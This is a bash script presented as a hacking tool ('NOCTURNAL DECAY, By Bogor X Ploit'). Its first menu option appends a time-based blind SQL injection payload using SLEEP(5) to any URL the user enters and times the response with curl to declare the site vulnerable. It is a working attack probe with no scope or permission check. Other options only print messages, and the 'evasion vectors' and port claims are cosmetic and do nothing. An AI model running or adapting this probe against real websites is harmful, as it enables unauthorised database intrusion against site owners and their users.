#!/usr/bin/env bash
C='\033[0;36m'; W='\033[1;37m'; R='\033[0;31m'; Y='\033[1;33m'; G='\033[0;32m'; N='\033[0m'

while true; do
    clear
    echo -e "${C}==================================================${N}"
    echo -e "${W}             NOCTURNAL DECAY${N}"
    echo -e "${W}             By Bogor X Ploit${N}"
    echo -e "${C}==================================================${N}"
    echo ""

    echo -e "${G}[1]${N} Initiate Silent DB Probe (Time-Based)"
    echo -e "${G}[2]${N} Data Extraction Sequence (Simulated)"
    echo -e "${G}[3]${N} Deploy Evasion Vectors"
    echo -e "${G}[4]${N} Return to Core"
    echo -e "${C}--------------------------------------------------${N}"

    echo -ne "${Y}Select option > ${N}"
    read -r sqli_choice

    case "$sqli_choice" in
        1)
            echo -ne "${Y}Enter Target Endpoint > ${N}"
            read -r target_url
            if [ -z "$target_url" ]; then
                echo -e "${R}[!] Endpoint cannot be empty.${N}"
                sleep 1
                continue
            fi
            
            echo -e "${G}[+] Initializing Silent Probe on Port 2023...${N}"
            sleep 1
            
            PAYLOAD="1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -"
            if [[ "$target_url" == *"="* ]]; then
                TEST_URL="${target_url}${PAYLOAD}"
            else
                TEST_URL="${target_url}?id=${PAYLOAD}"
            fi
            
            echo -e "${Y}[*] Injecting payload sequence...${N}"
            echo -e "${Y}[*] Analyzing server response time...${N}"
            
            RESPONSE_TIME=$(curl -o /dev/null -s -w "%{time_total}" "$TEST_URL")
            IS_VULN=$(awk "BEGIN {print ($RESPONSE_TIME > 4.5)}")

            if [ "$IS_VULN" -eq 1 ]; then
                echo -e "${G}[+] Vulnerability CONFIRMED. Server delay detected: ${RESPONSE_TIME}s${N}"
            else
                echo -e "${R}[-] Target is NOT vulnerable. Response: ${RESPONSE_TIME}s${N}"
            fi
            echo ""
            read -p "Press Enter to continue..."
            ;;
        2)
            echo -e "${R}[!] Real extraction requires a vulnerable target.${N}"
            echo -e "${Y}[*] Use tools like sqlmap for automated extraction.${N}"
            echo ""
            read -p "Press Enter to continue..."
            ;;
        3)
            echo -e "${G}[+] Loading Evasion Protocols...${N}"
            sleep 1
            echo -e "${W}[-] Space to Comment: Loaded${N}"
            echo -e "${W}[-] Random Case: Loaded${N}"
            echo -e "${W}[-] URL Encoding: Loaded${N}"
            echo -e "${W}[-] Hex Encoding: Loaded${N}"
            echo -e "${G}[+] Evasion vectors ready.${N}"
            echo ""
            read -p "Press Enter to continue..."
            ;;
        4) exit 0 ;;
        *) echo -e "${R}[!] Invalid choice.${N}"; sleep 1 ;;
    esac
done
